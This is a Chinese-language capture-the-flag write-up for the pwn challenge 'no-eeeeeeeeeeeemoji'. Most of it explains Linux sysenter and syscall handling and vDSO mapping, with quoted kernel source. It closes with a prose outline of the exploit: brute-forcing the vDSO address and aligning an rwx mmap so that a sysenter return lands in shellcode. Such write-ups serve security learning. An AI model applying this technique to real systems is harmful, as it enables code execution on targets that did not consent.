## Pwn

### no-eeeeeeeeeeeemoji

```
// file
./main: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=04de054da4e374f485c3d10b147634b527f62cd7, for GNU/Linux 3.2.0, stripped

// checksec
[*] '/home/u1f383/tmp/noemoji/main'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Ubuntu 18.04 + glibc 2.27-3ubuntu1.2。



程式邏輯很簡單，並且什麼 address 都給了 (包含 `mmap()` 出來的 rwx region)，而在讀取 4096 大小的 data 到 `mmap_address` 後，會做一些 memory operation 來破壞寫入的 data，最後執行 `mmap_address+0x200` 的 data，而在 `mmap_address+0x200` 有兩個可控的 shellcode，其他 shellcode 不是距離很遠，就是被寫成其他資料。如果填入 nop，會在最後執行 `write(1, mmap_address, 0x26)` 以及 `exit(0)`。



#### 32-bit fast system calls (sysenter / sysexit)

- [syscall 介紹](https://blog.packagecloud.io/eng/2016/04/05/the-definitive-guide-to-linux-system-calls/#sysentersysexit)

此篇文章的 kernel 版本並非最新，不過還是可以對 sysenter/sysexit 有初步的概念。

`sysenter`

- Prior to executing the **SYSENTER** instruction, software must specify the **privilege level 0 code segment** and **code entry point**, and the **privilege level 0 stack segment** and **stack pointer** by writing values to the following MSRs: (先改 cs + ss, eip, esp)
  - `IA32_SYSENTER_CS (MSR address 174H)` — The **lower 16 bits of this MSR** are the segment selector for the privilege level 0 code segment. This value is also used to determine the segment selector of the privilege level 0 **stack segment** (see the Operation section). This value **cannot indicate a null selector**.
  - `IA32_SYSENTER_EIP (MSR address 176H)` — The value of this MSR is **loaded into RIP** (thus, this value references the **first instruction** of the selected operating procedure or routine). In protected mode, only **bits 31:0 are loaded**.
  - `IA32_SYSENTER_ESP (MSR address 175H)` — The value of this MSR is **loaded into RSP** (thus, this value contains the **stack pointer** for the privilege level 0 stack). This value cannot represent a **non-canonical address**. In protected mode, only bits 31:0 are loaded.
  - 當接收到 `sysenter` 時，kernel 中的三個 MSRs 會更動

在 `arch/x86/vdso/vdso32-setup.c` 當中，有以下程式碼:

```c
void enable_sep_cpu(void)
{
    ...
	wrmsr(MSR_IA32_SYSENTER_EIP, (unsigned long) ia32_sysenter_target, 0);
```

In `arch/x86/include/uapi/asm/msr-index.h`:

```c
#define MSR_IA32_SYSENTER_EIP		0x00000176
```

`wrmsr` 代表 Write to Model Specific Register

`arch/x86/ia32/ia32entry.S` 定義 `sysenter` 執行時所作的行為:

```asm
/*
 * 32bit SYSENTER instruction entry.
 *
 * Arguments:
 * %eax	System call number.
 * %ebx Arg1
 * %ecx Arg2
 * %edx Arg3
 * %esi Arg4
 * %edi Arg5
 * %ebp user stack
 * 0(%ebp) Arg6	
 * 	
 * Interrupts off.
 *	
 * This is purely a fast path. For anything complicated we use the int 0x80
 * path below.	Set up a complete hardware stack frame to share code
 * with the int 0x80 path.
 */ 	
ENTRY(ia32_sysenter_target)
	CFI_STARTPROC32	simple
	CFI_SIGNAL_FRAME
	CFI_DEF_CFA	rsp,0
	CFI_REGISTER	rsp,rbp
	...
```

不過 `sysenter` 沒有儲存 return address，於是 user program 執行 `__kernel_vsyscall` 而非 `sysenter`，而 `__kernel_vsyscall` 雖由 kernel implement，不過在程式執行時會被 map 到 user process，而 `__kernel_vsyscall` 為 vDSO (virtual Dynamic Shared Object) 的一部分 (v3.13):

```asm
; arch/x86/vdso/vdso32/sysenter.S

__kernel_vsyscall:
.LSTART_vsyscall:
        push %ecx
.Lpush_ecx:
        push %edx
.Lpush_edx:
        push %ebp
.Lenter_kernel:
        movl %esp,%ebp
        sysenter
```

由此可見，`__kernal_vsyscall` 也是 `sysenter` 的封裝，而要怎麼取得 vDSO 的位置 -> ELF auxiliary vector

- getauxval (`AT_SYSINFO`) 
  - gdb `auxv` 可以看到 (`AT_SYSINFO`, x86 才有)
- 遍歷每個 env variable

linux v5.13 則是在 `/arch/x86/entry/vdso/vdso32/system_call.S`:

```asm
	.text
	.globl __kernel_vsyscall
	.type __kernel_vsyscall,@function
	ALIGN
__kernel_vsyscall:
	CFI_STARTPROC
	...
	pushl	%ecx
	CFI_ADJUST_CFA_OFFSET	4
	CFI_REL_OFFSET		ecx, 0
	pushl	%edx
	CFI_ADJUST_CFA_OFFSET	4
	CFI_REL_OFFSET		edx, 0
	pushl	%ebp
	CFI_ADJUST_CFA_OFFSET	4
	CFI_REL_OFFSET		ebp, 0

	#define SYSENTER_SEQUENCE	"movl %esp, %ebp; sysenter"
	#define SYSCALL_SEQUENCE	"movl %ecx, %ebp; syscall"
	#ifdef CONFIG_X86_64
		/* If SYSENTER (Intel) or SYSCALL32 (AMD) is available, use it. */
		ALTERNATIVE_2 "", SYSENTER_SEQUENCE, X86_FEATURE_SYSENTER32, \
	                  SYSCALL_SEQUENCE,  X86_FEATURE_SYSCALL32
    #else
        ALTERNATIVE "", SYSENTER_SEQUENCE, X86_FEATURE_SEP
    #endif
	...
```



在 `arch/x86/ia32/ia32entry.S` 有一段 `sysenter_dispatch`:

```asm
sysenter_dispatch:
        call    *ia32_sys_call_table(,%rax,8)
```

則是 `sysenter` 在執行 syscall 的工作，`ia32_sys_call_table` 是 syscall table，而執行後再透過 `sysexit_from_sys_call` 來返回 (同樣在 `arch/x86/ia32/ia32entry.S`):

```asm
sysexit_from_sys_call:
	andl    $~TS_COMPAT,TI_status+THREAD_INFO(%rsp,RIP-ARGOFFSET)
	/* clear IF, that popfq doesn't enable interrupts early */
	andl  $~0x200,EFLAGS-R11(%rsp) 
	movl	RIP-R11(%rsp),%edx		/* User %eip */
	CFI_REGISTER rip,rdx
	RESTORE_ARGS 0,24,0,0,0,0
	xorq	%r8,%r8
	xorq	%r9,%r9
	xorq	%r10,%r10
	xorq	%r11,%r11
	popfq_cfi
	/*CFI_RESTORE rflags*/
	popq_cfi %rcx				/* User %esp */
	CFI_REGISTER rsp,rcx
	TRACE_IRQS_ON
	ENABLE_INTERRUPTS_SYSEXIT32
```

在 `arch/x86/include/asm/irqflags.h`:

```c
#define ENABLE_INTERRUPTS_SYSEXIT32		\
	swapgs;					\
	sti;					\
	sysexit
```

最後透過 `sysexit` 離開。

#### syscall

- [no-eeeeeeeeemoji writeup](https://smallkirby.hatenablog.com/entry/2020/11/25/080534)

介紹的環境為 kernel 4.15 (ubuntu 18.04)。

根據 [x86 and amd64 instruction reference](https://www.felixcloutier.com/x86/syscall) 上所對 syscall 的描述:

- SYSCALL invokes an **OS system-call handler** at **privilege level 0**. It does so by loading **RIP from the IA32_LSTAR MSR** (after saving the address of the instruction following SYSCALL into **RCX**). (The WRMSR instruction ensures that the IA32_LSTAR MSR always contain a canonical address.)
  - return address 會被存在 rcx，並且 rip 會被換成 IA32_LSTAR MSR 所儲存的值
- SYSCALL also **saves RFLAGS into R11** and then masks **RFLAGS using the IA32_FMASK MSR** (MSR address C0000084H); specifically, the processor clears in RFLAGS every bit corresponding to a bit that is set in the IA32_FMASK MSR.
  - rflags 會保存在 r11，然後被替換成 IA32_FMASK MSR
  - processor 會清除 rflags 對應到 IA32_FMASK MSR 的每個 bit
- SYSCALL loads the **CS and SS selectors** with values derived from bits **47:32 of the IA32_STAR MSR**. However, the CS and SS descriptor caches are **not** loaded from the descriptors (in GDT or LDT) referenced by those selectors. Instead, the descriptor caches are loaded with **fixed values**. See the Operation section for details. It is the responsibility of OS software to ensure that the descriptors (in GDT or LDT) referenced by those selector values correspond to the fixed values loaded into the descriptor caches; the **SYSCALL instruction does not ensure this correspondence**.
- The SYSCALL instruction does **not save the stack pointer (RSP)**. If the OS system-call handler will change the stack pointer, it is the responsibility of **software** to **save the previous value of the stack pointer**. This might be done prior to executing SYSCALL, with software restoring the stack pointer with the instruction following SYSCALL (which will be executed after SYSRET). Alternatively, the OS system-call handler may save the stack pointer and restore it before executing SYSRET.

kernel 在啟動時，對 MSR 的初始化:

```c
// arch/x86/kernel/cpu/common.c

void syscall_init(void)
{
	wrmsr(MSR_STAR, 0, (__USER32_CS << 16) | __KERNEL_CS);
	wrmsrl(MSR_LSTAR, (unsigned long)entry_SYSCALL_64);
    ...
```

而 `entry_SYSCALL_64` 做了哪些事:

```asm
; arch/x86/entry/entry_64.S

ENTRY(entry_SYSCALL_64)
	UNWIND_HINT_EMPTY
	/*
	 * Interrupts are off on entry.
	 * We do not frame this tiny irq-off block with TRACE_IRQS_OFF/ON,
	 * it is too small to ever cause noticeable irq latency.
	 */
	; 從 MSR address C0000102H 取得 kernel GS base
	swapgs
	/*
	 * This path is only taken when PAGE_TABLE_ISOLATION is disabled so it
	 * is not required to switch CR3.
	 */
	; 儲存 userspace 的 rsp 到 per-cpu variable rsp_scratch
	movq	%rsp, PER_CPU_VAR(rsp_scratch)
	; 從 per-cpu var 取得 kernel rsp cpu_current_top_of_stack，載入到 rsp
	; 代表從 user mode 切換到 kernel mode
	movq	PER_CPU_VAR(cpu_current_top_of_stack), %rsp

	/* Construct struct pt_regs on stack */
	; 將 pt_regs 的 value push 到 stack 上
	pushq	$__USER_DS			/* pt_regs->ss */
	pushq	PER_CPU_VAR(rsp_scratch)	/* pt_regs->sp */
	pushq	%r11				/* pt_regs->flags */
	pushq	$__USER_CS			/* pt_regs->cs */
	pushq	%rcx				/* pt_regs->ip */
GLOBAL(entry_SYSCALL_64_after_hwframe)
	pushq	%rax				/* pt_regs->orig_ax */

/*
.macro PUSH_AND_CLEAR_REGS rdx=%rdx rax=%rax save_ret=0
	PUSH_REGS rdx=\rdx, rax=\rax, save_ret=\save_ret
	CLEAR_REGS
.endm
*/
	; https://stackoverflow.com/a/60330227
	PUSH_AND_CLEAR_REGS rax=$-ENOSYS

	; 關閉 IRQ (interrupt request)
	TRACE_IRQS_OFF

	/* IRQs are off. */
	movq	%rsp, %rdi
	; 實際執行 syscall
	call	do_syscall_64		/* returns with IRQs disabled */

	TRACE_IRQS_IRETQ		/* we're about to change IF */

	/*
	 * Try to use SYSRET instead of IRET if we're returning to
	 * a completely clean 64-bit userspace context.  If we're not,
	 * go to the slow exit path.
	 */
	; 盡量使用 sysret 而非 iret
	movq	RCX(%rsp), %rcx
	movq	RIP(%rsp), %r11

	cmpq	%rcx, %r11	/* SYSRET requires RCX == RIP */
	jne	swapgs_restore_regs_and_return_to_usermode

	/*
	 * On Intel CPUs, SYSRET with non-canonical RCX/RIP will #GP
	 * in kernel space.  This essentially lets the user take over
	 * the kernel, since userspace controls RSP.
	 *
	 * If width of "canonical tail" ever becomes variable, this will need
	 * to be updated to remain correct on both old and new CPUs.
	 *
	 * Change top bits to match most significant bit (47th or 56th bit
	 * depending on paging mode) in the address.
	 */
	shl	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
	sar	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx

	/* If this changed %rcx, it was not canonical */
	cmpq	%rcx, %r11
	jne	swapgs_restore_regs_and_return_to_usermode

	cmpq	$__USER_CS, CS(%rsp)		/* CS must match SYSRET */
	jne	swapgs_restore_regs_and_return_to_usermode

	movq	R11(%rsp), %r11
	cmpq	%r11, EFLAGS(%rsp)		/* R11 == RFLAGS */
	jne	swapgs_restore_regs_and_return_to_usermode

	/*
	 * SYSCALL clears RF when it saves RFLAGS in R11 and SYSRET cannot
	 * restore RF properly. If the slowpath sets it for whatever reason, we
	 * need to restore it correctly.
	 *
	 * SYSRET can restore TF, but unlike IRET, restoring TF results in a
	 * trap from userspace immediately after SYSRET.  This would cause an
	 * infinite loop whenever #DB happens with register state that satisfies
	 * the opportunistic SYSRET conditions.  For example, single-stepping
	 * this user code:
	 *
	 *           movq	$stuck_here, %rcx
	 *           pushfq
	 *           popq %r11
	 *   stuck_here:
	 *
	 * would never get past 'stuck_here'.
	 */
	; syscall 會在儲存 rflags 時清空 RF，不過如果因為某個原因被 set，則必須 restore 他
	; https://en.wikipedia.org/wiki/FLAGS_register
	testq	$(X86_EFLAGS_RF|X86_EFLAGS_TF), %r11
	jnz	swapgs_restore_regs_and_return_to_usermode

	/* nothing to check for RSP */

	cmpq	$__USER_DS, SS(%rsp)		/* SS must match SYSRET */
	jne	swapgs_restore_regs_and_return_to_usermode

	/*
	 * We win! This label is here just for ease of understanding
	 * perf profiles. Nothing jumps here.
	 */
syscall_return_via_sysret:
	/* rcx and r11 are already restored (see code above) */
	UNWIND_HINT_EMPTY
	POP_REGS pop_rdi=0 skip_r11rcx=1

	/*
	 * Now all regs are restored except RSP and RDI.
	 * Save old stack pointer and switch to trampoline stack.
	 */
	movq	%rsp, %rdi
	movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp

	pushq	RSP-RDI(%rdi)	/* RSP */
	pushq	(%rdi)		/* RDI */

	/*
	 * We are on the trampoline stack.  All regs except RDI are live.
	 * We can do future final exit work right here.
	 */
	SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi

	popq	%rdi
	popq	%rsp
	USERGS_SYSRET64
END(entry_SYSCALL_64)
```

- syscall 不保存 userspace 的 rsp，這是 software 的責任 (kernel)
- `swapgs` 可以交換 user GS base 以及 kernel GS base
- per-CPU variable 可以透過 `%gs:var` 來存取
- `SYSRET` 必須滿足 `rcx == rip && rcx is canonical`
  - canonical 為 address space 所允許的位址，x86_64 為:
    - 0 ~ 0x 0000 7fff ffff ffff
    - 0x ffff  8000 0000 0000 ~ 0x ffff ffff ffff ffff
  - 如果不滿足，則會執行 `iret` (`swapgs_restore_regs_and_return_to_usermode`)，為 slow exit path
- 如果 TF 或 RF 需要被 restore，就必須執行 `iret` (`swapgs_restore_regs_and_return_to_usermode`)，因為 `sysret`沒辦法好好 handle restore 的問題

而 syscall 本體為 `do_syscall_64`:

```c
#ifdef CONFIG_X86_64
__visible noinstr void do_syscall_64(unsigned long nr, struct pt_regs *regs)
{
	add_random_kstack_offset();
	nr = syscall_enter_from_user_mode(regs, nr);

	instrumentation_begin();
	if (likely(nr < NR_syscalls)) {
		nr = array_index_nospec(nr, NR_syscalls); // <--- 執行 syscall
		regs->ax = sys_call_table[nr](regs);
#ifdef CONFIG_X86_X32_ABI
	} else if (likely((nr & __X32_SYSCALL_BIT) &&
			  (nr & ~__X32_SYSCALL_BIT) < X32_NR_syscalls)) {
		nr = array_index_nospec(nr & ~__X32_SYSCALL_BIT,
					X32_NR_syscalls);
		regs->ax = x32_sys_call_table[nr](regs);
#endif
	}
	instrumentation_end();
	syscall_exit_to_user_mode(regs);
}
#endif
```

確保 syscall 在合理範圍，並且執行對應的 syscall，執行完畢後就離開。



根據以上分析，glibc 在定義 syscall wrapper 時，只需要將 error handle 以及 argument check 做好，之後按照 syscall calling convention 來執行 `syscall` 即可，不用在額外存 `rsp`/`rip` (kernel 會做掉)。然而在呼叫如 `gettimeofday()` 時，卻是執行 "vDSO" 區域的 instruction，如果在 gdb 使用 `` 將 memory dump 出來，會得到以下資訊:

```
// file
vdso-64.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=f11caa76f8b475187ffc7eeea42a572e988021bc, stripped

// checksec
[!] Did not find any GOT entries
[*] '/home/u1f383/tmp/noemoji/vdso-64.so'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    
// readelf -h ./vdso-64.so
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              DYN (Shared object file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x660
  Start of program headers:          64 (bytes into file)
  Start of section headers:          3984 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         4
  Size of section headers:           64 (bytes)
  Number of section headers:         16
  Section header string table index: 15
```

拿去 IDA pro 反編譯，會發現只有下列幾個 function:

- `start`
- `gettimeofday`
- `time`
- `clock_gettime`
- `clock_getres`
- `getcpu`

由於內部不執行 `syscall` 的關係，沒切換到 kernel mode，因此效率也高許多。

kernel 會把 code map 到 binary 的 vdso section，而 vdso 在 `init_vdso()` 被初始化:

```c
// arch/x86/entry/vdso/vma.c

static int __init init_vdso(void)
{
	BUILD_BUG_ON(VDSO_CLOCKMODE_MAX >= 32);

	init_vdso_image(&vdso_image_64);

#ifdef CONFIG_X86_X32_ABI
	init_vdso_image(&vdso_image_x32);
#endif

	return 0;
}
subsys_initcall(init_vdso);

/* ----------------------------- */

void __init init_vdso_image(const struct vdso_image *image)
{
	BUG_ON(image->size % PAGE_SIZE != 0);

	apply_alternatives((struct alt_instr *)(image->data + image->alt),
			   (struct alt_instr *)(image->data + image->alt +
						image->alt_len));
}
```

變數 `vdso_image_64` 就已經包含 vDSO 的資料了 (整個 ELF)，而 `vdso_image_64` 是在 `arch/x86/entry/vdso/vdso2c.c` 會在 kernel build 時產生的文件所編譯得到，檔名為 `arch/x86/entry/vdso/vdso-image-64.c`。

而 map vdso 的部分為:

```c
static int map_vdso_randomized(const struct vdso_image *image)
{
	unsigned long addr = vdso_addr(current->mm->start_stack, image->size-image->sym_vvar_start);

	return map_vdso(image, addr);
}

/* ---------------- */

#ifdef CONFIG_X86_64
/*
 * Put the vdso above the (randomized) stack with another randomized
 * offset.  This way there is no hole in the middle of address space.
 * To save memory make sure it is still in the same PTE as the stack
 * top.  This doesn't give that many random bits.
 *
 * Note that this algorithm is imperfect: the distribution of the vdso
 * start address within a PMD is biased toward the end.
 *
 * Only used for the 64-bit and x32 vdsos.
 */
static unsigned long vdso_addr(unsigned long start, unsigned len)
{
	unsigned long addr, end;
	unsigned offset;

	/*
	 * Round up the start address.  It can start out unaligned as a result
	 * of stack start randomization.
	 */
	start = PAGE_ALIGN(start);

	/* Round the lowest possible end address up to a PMD boundary. */
	end = (start + len + PMD_SIZE - 1) & PMD_MASK;
	if (end >= TASK_SIZE_MAX)
		end = TASK_SIZE_MAX;
	end -= len;

	if (end > start) {
		offset = get_random_int() % (((end - start) >> PAGE_SHIFT) + 1);
		addr = start + (offset << PAGE_SHIFT);
	} else {
		addr = start;
	}

	/*
	 * Forcibly align the final address in case we have a hardware
	 * issue that requires alignment for performance reasons.
	 */
	addr = align_vdso_addr(addr);

	return addr;
}

/* ---------------- */

/*
 * Add vdso and vvar mappings to current process.
 * @image          - blob to map
 * @addr           - request a specific address (zero to map at free addr)
 */
static int map_vdso(const struct vdso_image *image, unsigned long addr)
{
	struct mm_struct *mm = current->mm;
	struct vm_area_struct *vma;
	unsigned long text_start;
	int ret = 0;

	if (mmap_write_lock_killable(mm))
		return -EINTR;

	addr = get_unmapped_area(NULL, addr,
				 image->size - image->sym_vvar_start, 0, 0);
	if (IS_ERR_VALUE(addr)) {
		ret = addr;
		goto up_fail;
	}

	text_start = addr - image->sym_vvar_start;

	/*
	 * MAYWRITE to allow gdb to COW and set breakpoints
	 */
    // map vdso
	vma = _install_special_mapping(mm,
				       text_start,
				       image->size,
				       VM_READ|VM_EXEC|
				       VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC,
				       &vdso_mapping);

	if (IS_ERR(vma)) {
		ret = PTR_ERR(vma);
		goto up_fail;
	}

    // map vvar
	vma = _install_special_mapping(mm,
				       addr,
				       -image->sym_vvar_start,
				       VM_READ|VM_MAYREAD|VM_IO|VM_DONTDUMP|
				       VM_PFNMAP,
				       &vvar_mapping);

	if (IS_ERR(vma)) {
		ret = PTR_ERR(vma);
		do_munmap(mm, text_start, image->size, NULL);
	} else {
		current->mm->context.vdso = (void __user *)text_start;
		current->mm->context.vdso_image = image;
	}

up_fail:
	mmap_write_unlock(mm);
	return ret;
}
```

首先 map `text_start` + 權限 `VM_READ|VM_EXEC|`，即為 vdso 的位置；而後 map `addr` + 權限 `VM_READ|VM_MAYREAD|VM_IO|VM_DONTDUMP|`，為 vvar 的位置，而兩者與 stack 的相對位置為:

- vvar
- vdso
- stack



在 32-bit 的模式下 (`CONFIG_IA32_EMULATION` 而非真正的 32-bit):

```c
void syscall_init(void)
{
	...
#ifdef CONFIG_IA32_EMULATION
	wrmsrl(MSR_CSTAR, (unsigned long)entry_SYSCALL_compat);
	/*
	 * This only works on Intel CPUs.
	 * On AMD CPUs these MSRs are 32-bit, CPU truncates MSR_IA32_SYSENTER_EIP.
	 * This does not cause SYSENTER to jump to the wrong location, because
	 * AMD doesn't allow SYSENTER in long mode (either 32- or 64-bit).
	 */
	wrmsrl_safe(MSR_IA32_SYSENTER_CS, (u64)__KERNEL_CS);
	wrmsrl_safe(MSR_IA32_SYSENTER_ESP,
		    (unsigned long)(cpu_entry_stack(smp_processor_id()) + 1));
    // 將 entry_SYSENTER_compat 放入 MSR_IA32_SYSENTER_EIP
	wrmsrl_safe(MSR_IA32_SYSENTER_EIP, (u64)entry_SYSENTER_compat);
```

`entry_SYSENTER_compat` (`arch/x86/entry/entry_64_compat.S`) 即是 32-bit 呼叫 `sysenter` 的進入點，實作原理大同小異，但是重要的是:

```asm
/*
 * 32-bit SYSENTER entry.
 *
 * 32-bit system calls through the vDSO's __kernel_vsyscall enter here
 * on 64-bit kernels running on Intel CPUs.
 *
 * The SYSENTER instruction, in principle, should *only* occur in the
 * vDSO.  In practice, a small number of Android devices were shipped
 * with a copy of Bionic that inlined a SYSENTER instruction.  This
 * never happened in any of Google's Bionic versions -- it only happened
 * in a narrow range of Intel-provided versions.
 *
 * SYSENTER loads SS, RSP, CS, and RIP from previously programmed MSRs.
 * IF and VM in RFLAGS are cleared (IOW: interrupts are off).
 * SYSENTER does not save anything on the stack,
 * and does not save old RIP (!!!), RSP, or RFLAGS.
 *
 * Arguments:
 * eax  system call number
 * ebx  arg1
 * ecx  arg2
 * edx  arg3
 * esi  arg4
 * edi  arg5
 * ebp  user stack
 * 0(%ebp) arg6
 */
SYM_CODE_START(entry_SYSENTER_compat)
	UNWIND_HINT_EMPTY
	/* Interrupts are off on entry. */
	SWAPGS

	pushq	%rax
	SWITCH_TO_KERNEL_CR3 scratch_reg=%rax
	popq	%rax

	movq	PER_CPU_VAR(cpu_current_top_of_stack), %rsp

	/* Construct struct pt_regs on stack */
	pushq	$__USER32_DS		/* pt_regs->ss */
	pushq	$0			/* pt_regs->sp = 0 (placeholder) */

	/*
	 * Push flags.  This is nasty.  First, interrupts are currently
	 * off, but we need pt_regs->flags to have IF set.  Second, if TS
	 * was set in usermode, it's still set, and we're singlestepping
	 * through this code.  do_SYSENTER_32() will fix up IF.
	 */
	pushfq				/* pt_regs->flags (except IF = 0) */
	pushq	$__USER32_CS		/* pt_regs->cs */
	pushq	$0			/* pt_regs->ip = 0 (placeholder) */
SYM_INNER_LABEL(entry_SYSENTER_compat_after_hwframe, SYM_L_GLOBAL)

	/*
	 * User tracing code (ptrace or signal handlers) might assume that
	 * the saved RAX contains a 32-bit number when we're invoking a 32-bit
	 * syscall.  Just in case the high bits are nonzero, zero-extend
	 * the syscall number.  (This could almost certainly be deleted
	 * with no ill effects.)
	 */
	movl	%eax, %eax

	pushq	%rax			/* pt_regs->orig_ax */
	pushq	%rdi			/* pt_regs->di */
	pushq	%rsi			/* pt_regs->si */
	pushq	%rdx			/* pt_regs->dx */
	pushq	%rcx			/* pt_regs->cx */
	pushq	$-ENOSYS		/* pt_regs->ax */
	pushq   $0			/* pt_regs->r8  = 0 */
	xorl	%r8d, %r8d		/* nospec   r8 */
	pushq   $0			/* pt_regs->r9  = 0 */
	xorl	%r9d, %r9d		/* nospec   r9 */
	pushq   $0			/* pt_regs->r10 = 0 */
	xorl	%r10d, %r10d		/* nospec   r10 */
	pushq   $0			/* pt_regs->r11 = 0 */
	xorl	%r11d, %r11d		/* nospec   r11 */
	pushq   %rbx                    /* pt_regs->rbx */
	xorl	%ebx, %ebx		/* nospec   rbx */
	pushq   %rbp                    /* pt_regs->rbp (will be overwritten) */
	xorl	%ebp, %ebp		/* nospec   rbp */
	pushq   $0			/* pt_regs->r12 = 0 */
	xorl	%r12d, %r12d		/* nospec   r12 */
	pushq   $0			/* pt_regs->r13 = 0 */
	xorl	%r13d, %r13d		/* nospec   r13 */
	pushq   $0			/* pt_regs->r14 = 0 */
	xorl	%r14d, %r14d		/* nospec   r14 */
	pushq   $0			/* pt_regs->r15 = 0 */
	xorl	%r15d, %r15d		/* nospec   r15 */

	UNWIND_HINT_REGS

	cld

	/*
	 * SYSENTER doesn't filter flags, so we need to clear NT and AC
	 * ourselves.  To save a few cycles, we can check whether
	 * either was set instead of doing an unconditional popfq.
	 * This needs to happen before enabling interrupts so that
	 * we don't get preempted with NT set.
	 *
	 * If TF is set, we will single-step all the way to here -- do_debug
	 * will ignore all the traps.  (Yes, this is slow, but so is
	 * single-stepping in general.  This allows us to avoid having
	 * a more complicated code to handle the case where a user program
	 * forces us to single-step through the SYSENTER entry code.)
	 *
	 * NB.: .Lsysenter_fix_flags is a label with the code under it moved
	 * out-of-line as an optimization: NT is unlikely to be set in the
	 * majority of the cases and instead of polluting the I$ unnecessarily,
	 * we're keeping that code behind a branch which will predict as
	 * not-taken and therefore its instructions won't be fetched.
	 */
	testl	$X86_EFLAGS_NT|X86_EFLAGS_AC|X86_EFLAGS_TF, EFLAGS(%rsp)
	jnz	.Lsysenter_fix_flags
.Lsysenter_flags_fixed:

	movq	%rsp, %rdi
	call	do_SYSENTER_32
	/* XEN PV guests always use IRET path */
	ALTERNATIVE "testl %eax, %eax; jz swapgs_restore_regs_and_return_to_usermode", \
		    "jmp swapgs_restore_regs_and_return_to_usermode", X86_FEATURE_XENPV
	jmp	sysret32_from_system_call

.Lsysenter_fix_flags:
	pushq	$X86_EFLAGS_FIXED
	popfq
	jmp	.Lsysenter_flags_fixed
SYM_INNER_LABEL(__end_entry_SYSENTER_compat, SYM_L_GLOBAL)
SYM_CODE_END(entry_SYSENTER_compat)
```

**syscall 時 rip 會被保存到 rcx，但在 sysenter 中，eip 沒有被存起來**:

```
 * SYSENTER does not save anything on the stack,
 * and does not save old RIP (!!!), RSP, or RFLAGS.
```

而 `do_SYSENTER_32` 為實際 syscall 執行點:

```c
// arch/x86/entry/common.c

__visible noinstr long do_SYSENTER_32(struct pt_regs *regs)
{
	/* SYSENTER loses RSP, but the vDSO saved it in RBP. */
	regs->sp = regs->bp;

	/* SYSENTER clobbers EFLAGS.IF.  Assume it was set in usermode. */
	regs->flags |= X86_EFLAGS_IF;

	return do_fast_syscall_32(regs);
}
```

將 bp assign 給 sp、設定 IF flag 後，呼叫 `do_fast_syscall_32()`:

```c
// arch/x86/entry/common.c

/* Returns 0 to return using IRET or 1 to return using SYSEXIT/SYSRETL. */
__visible noinstr long do_fast_syscall_32(struct pt_regs *regs)
{
	/*
	 * Called using the internal vDSO SYSENTER/SYSCALL32 calling
	 * convention.  Adjust regs so it looks like we entered using int80.
	 */
	unsigned long landing_pad = (unsigned long)current->mm->context.vdso +
					vdso_image_32.sym_int80_landing_pad;

	/*
	 * SYSENTER loses EIP, and even SYSCALL32 needs us to skip forward
	 * so that 'regs->ip -= 2' lands back on an int $0x80 instruction.
	 * Fix it up.
	 */
	regs->ip = landing_pad;

	/* Invoke the syscall. If it failed, keep it simple: use IRET. */
	if (!__do_fast_syscall_32(regs))
		return 0;

#ifdef CONFIG_X86_64
	/*
	 * Opportunistic SYSRETL: if possible, try to return using SYSRETL.
	 * SYSRETL is available on all 64-bit CPUs, so we don't need to
	 * bother with SYSEXIT.
	 *
	 * Unlike 64-bit opportunistic SYSRET, we can't check that CX == IP,
	 * because the ECX fixup above will ensure that this is essentially
	 * never the case.
	 */
	return regs->cs == __USER32_CS && regs->ss == __USER_DS &&
		regs->ip == landing_pad &&
		(regs->flags & (X86_EFLAGS_RF | X86_EFLAGS_TF)) == 0;
#else
	/*
	 * Opportunistic SYSEXIT: if possible, try to return using SYSEXIT.
	 *
	 * Unlike 64-bit opportunistic SYSRET, we can't check that CX == IP,
	 * because the ECX fixup above will ensure that this is essentially
	 * never the case.
	 *
	 * We don't allow syscalls at all from VM86 mode, but we still
	 * need to check VM, because we might be returning from sys_vm86.
	 */
	return static_cpu_has(X86_FEATURE_SEP) &&
		regs->cs == __USER_CS && regs->ss == __USER_DS &&
		regs->ip == landing_pad &&
		(regs->flags & (X86_EFLAGS_RF | X86_EFLAGS_TF | X86_EFLAGS_VM)) == 0;
#endif
}
```

`landing_pad` 為 vdso + `sym_int80_landing_pad`，代表執行 `SYSEXIT` 後，eip 會是這個 address，而 `sym_int80_landing_pad` 會是 0x939，而這是一個固定的位置，代表每次執行 `SYSENTER`，並透過 `SYSEXIT` 返回後，都會到那個 address (vdso + 0x939)，而 vdso + 0x939 為:

```asm
...
sysenter
int 0x80
pop ebp ; <---- here
pop edx
pop ecx
ret
...
```



---



在 64-bit mode call `sysenter`，返回位置會是 vdso 的低 32 bit + offset (`sym_int80_landing_pad`)，在 ubuntu 20.04 下，offset 是 0xB49，因此 exploit 過程如下:

- 取得 vdso base `0x7FF_XXYYY000`，得知 `0xXXYYY000`+ 0xb49 為 return 的位置
  - `XX` 部分必須要是 `00`，因此需要一點 brute force
- 而 `mmap()` 的範圍在 `0x10000` ~ `0x3e7000`，由於可以重複 `mmap()`，因此可以讓 `mmap_addr == 0xYYY000`，這樣 `mmap_addr + 0xb49` 就是可控的，並且 `sysenter` 回來後會直接執行 `mmap_addr + 0xb49`
- 之後在 offset 0x200 寫入 `sysenter`，在 offset 0xb49 寫入 shellcode 即可

**執行完 sysenter 後會 downgraded 成 32 bit**。

